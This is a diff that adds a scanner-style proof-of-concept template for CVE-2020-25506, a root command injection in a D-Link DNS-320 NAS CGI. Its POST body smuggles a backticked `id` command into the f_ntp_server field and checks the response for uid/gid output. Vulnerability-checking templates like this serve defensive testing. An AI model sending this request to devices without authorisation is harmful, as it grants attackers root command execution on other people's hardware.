@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "D-Link DNS-320 固件 v2.06B01 的 system_mgr.cgi 组件中 f_ntp_server 参数存在 OS 命令注入漏洞。通过 POST 请求发送特制 payload，可在目标设备上以 root 权限执行任意命令。"
+id = "POC-AVE-2020-1106"
+name = "D-Link DNS-320 system_mgr.cgi 命令注入 PoC"
+severity = "critical"
+tags = ["ave-2020-1106"]
+vuln_id = [
+    "CVE-2020-25506",
+    "AVE-2020-1106",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/system_mgr.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "C1=ON&cmd=cgi_ntp_time&f_ntp_server=`id`"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "root",
+]
